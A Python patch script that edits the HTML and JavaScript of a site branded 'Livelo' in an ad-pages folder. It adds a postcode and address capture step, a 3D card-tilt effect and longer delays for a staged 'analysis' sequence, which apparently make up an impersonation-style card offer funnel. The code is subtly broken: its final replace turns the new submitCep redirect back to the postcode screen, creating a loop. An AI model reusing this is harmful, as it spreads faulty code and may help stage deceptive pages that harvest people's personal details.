import os
import re

html_path = r"d:\Paginas ADS\Livelo\templates\index.html"
js_path = r"d:\Paginas ADS\Livelo\static\js\main.js"

with open(html_path, "r", encoding="utf-8") as f:
    html = f.read()

# 1. Inject screen-cep before screen-shipping-success
screen_cep_html = """
<!-- ═══════ LOCALIZAÇÃO / CEP ═══════ -->
<div class="screen" id="screen-cep">
<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
<div style="text-align:center;margin-bottom:28px">
<img alt="Logo" class="sys-logo" src="{{ sys_config.get('system_logo', '/static/images/logo.png') }}" style="height:96px; max-width:100%; object-fit:contain; display:inline-block;"/>
</div>
<div class="step-card funnel-card">
<h2 class="step-title" style="font-size:1.3rem;margin-bottom:8px">Onde vamos entregar?</h2>
<p class="step-sub" style="font-size:0.9rem;color:var(--text-muted);margin-bottom:24px">Informe seu CEP para calcularmos o prazo de entrega.</p>

<div class="input-group">
<label class="input-label">CEP</label>
<input type="text" id="input-cep" class="input-field" placeholder="00000-000" maxlength="9" oninput="mascaraCep(this)" style="font-size:1.1rem;text-align:center;letter-spacing:2px">
</div>

<div id="address-fields" class="hidden" style="margin-top:20px;text-align:left;animation: fadeIn 0.4s ease forwards;">
<div class="input-group" style="margin-bottom:12px">
<label class="input-label">Endereço</label>
<input type="text" id="input-rua" class="input-field" disabled style="background:#F3F4F6">
</div>
<div style="display:flex;gap:12px;margin-bottom:12px">
<div class="input-group" style="flex:1">
<label class="input-label">Número</label>
<input type="text" id="input-numero" class="input-field" placeholder="123">
</div>
<div class="input-group" style="flex:1">
<label class="input-label">Complemento</label>
<input type="text" id="input-complemento" class="input-field" placeholder="Apto 1">
</div>
</div>
<div class="input-group" style="margin-bottom:12px">
<label class="input-label">Bairro</label>
<input type="text" id="input-bairro" class="input-field" disabled style="background:#F3F4F6">
</div>
<div class="input-group">
<label class="input-label">Cidade/UF</label>
<input type="text" id="input-cidade-uf" class="input-field" disabled style="background:#F3F4F6">
</div>
</div>

<div class="error-msg hidden" id="cep-error"></div>
<button class="btn-primary" id="btn-cep-buscar" onclick="buscarCep()" style="margin-top:24px">Buscar CEP</button>
<button class="btn-primary hidden" id="btn-cep-continuar" onclick="submitCep()" style="margin-top:24px">Confirmar Endereço →</button>
</div>
<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2026 · Todos os direitos reservados</p>
</footer>
</div>
</div>
"""

if 'id="screen-cep"' not in html:
    html = html.replace('<!-- ═══════ SHIPPING SUCCESS (Img 5) ═══════ -->', screen_cep_html + '\n<!-- ═══════ SHIPPING SUCCESS (Img 5) ═══════ -->')

# 2. Modify hardcoded addresses in HTML
html = html.replace('<span id="display-rua" style="color:#1A1A1A">Rua Pero de Araújo, 111 - Casa</span>', '<span id="display-rua" style="color:#1A1A1A"></span>')
html = html.replace('<span id="display-bairro" style="color:#1A1A1A">Jardim Maringá - São Paulo/SP</span>', '<span id="display-bairro" style="color:#1A1A1A"></span>')
html = html.replace('<span id="display-cep" style="color:#1A1A1A">CEP: 03525-040</span>', '<span id="display-cep" style="color:#1A1A1A"></span>')
html = html.replace('<span id="sum-rua">Rua Pero de Araújo, 111</span>', '<span id="sum-rua"></span>')
html = html.replace('<span id="sum-bairro">Jardim Maringá</span>', '<span id="sum-bairro"></span>')

with open(html_path, "w", encoding="utf-8") as f:
    f.write(html)

with open(js_path, "r", encoding="utf-8") as f:
    js = f.read()

# 3. Modify submitCardStyle to go to CEP step and add 3D Tilt logic + CEP validation
js_additions = """
// ============================================================================
// CEP & ENDEREÇO
// ============================================================================
function mascaraCep(input) {
  let v = input.value.replace(/\D/g, '');
  if (v.length > 5) v = v.replace(/^(\d{5})(\d)/, '$1-$2');
  input.value = v;
}

async function buscarCep() {
  const cep = $id('input-cep').value.replace(/\D/g, '');
  if (cep.length !== 8) return showErr('cep-error', 'Digite um CEP válido.');
  
  $id('btn-cep-buscar').innerText = 'Buscando...';
  hideErr('cep-error');
  
  try {
    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
    const data = await res.json();
    if (data.erro) throw new Error();
    
    $id('input-rua').value = data.logradouro;
    $id('input-bairro').value = data.bairro;
    $id('input-cidade-uf').value = `${data.localidade}/${data.uf}`;
    
    STATE.cep = data.cep;
    STATE.rua = data.logradouro;
    STATE.bairro = data.bairro;
    STATE.cidade = data.localidade;
    STATE.uf = data.uf;
    
    $id('address-fields').classList.remove('hidden');
    $id('btn-cep-buscar').classList.add('hidden');
    $id('btn-cep-continuar').classList.remove('hidden');
    $id('input-numero').focus();
    
  } catch(e) {
    showErr('cep-error', 'CEP não encontrado.');
    $id('btn-cep-buscar').innerText = 'Buscar CEP';
  }
}

function submitCep() {
  const num = $id('input-numero').value.trim();
  if (!num) return showErr('cep-error', 'Informe o número do endereço.');
  const comp = $id('input-complemento').value.trim();
  
  STATE.numero = num;
  STATE.complemento = comp;
  
  // Fill summary screens
  const fullRua = `${STATE.rua}, ${num}` + (comp ? ` - ${comp}` : '');
  const fullBairro = `${STATE.bairro} - ${STATE.cidade}/${STATE.uf}`;
  
  [$id('display-rua'), $id('sum-rua')].forEach(el => { if(el) el.innerText = fullRua; });
  [$id('display-bairro'), $id('sum-bairro')].forEach(el => { if(el) el.innerText = fullBairro; });
  if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
  
  goToStep('shipping-success');
}

// ============================================================================
// EFEITO 3D NO CARTÃO (Tilt)
// ============================================================================
document.addEventListener("DOMContentLoaded", () => {
    const card = document.getElementById('advanced-card-preview');
    if (card) {
        document.addEventListener('mousemove', (e) => {
            if(!card.getBoundingClientRect) return;
            const rect = card.getBoundingClientRect();
            // Somente aplica se o mouse estiver perto do card
            const isHovering = (e.clientX >= rect.left - 50 && e.clientX <= rect.right + 50 &&
                                e.clientY >= rect.top - 50 && e.clientY <= rect.bottom + 50);
            if(isHovering) {
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                const xPct = x / rect.width;
                const yPct = y / rect.height;
                const rotateX = (yPct - 0.5) * -15; // max 15deg
                const rotateY = (xPct - 0.5) * 15;
                card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
                card.style.transition = 'transform 0.1s ease-out';
            } else {
                card.style.transform = `perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)`;
                card.style.transition = 'transform 0.5s ease-out';
            }
        });
    }
});
"""

if "buscarCep" not in js:
    js = js + "\n" + js_additions

js = js.replace("goToStep('shipping-success');", "goToStep('cep'); // Redirects to new CEP step")

# Improve analysis steps timing
js = js.replace("setTimeout(() => { if($id('astep-1'))", "setTimeout(() => { if($id('astep-1'))")
# In main.js startAnalysis() looks like this:
js = js.replace("}, 1200)", "}, 1500)")
js = js.replace("}, 2500)", "}, 3200)")
js = js.replace("}, 3600)", "}, 4800)")
js = js.replace("}, 4700)", "}, 6500)")
js = js.replace("}, 5200)", "}, 7500)")

with open(js_path, "w", encoding="utf-8") as f:
    f.write(js)

print("Upgrade successful")
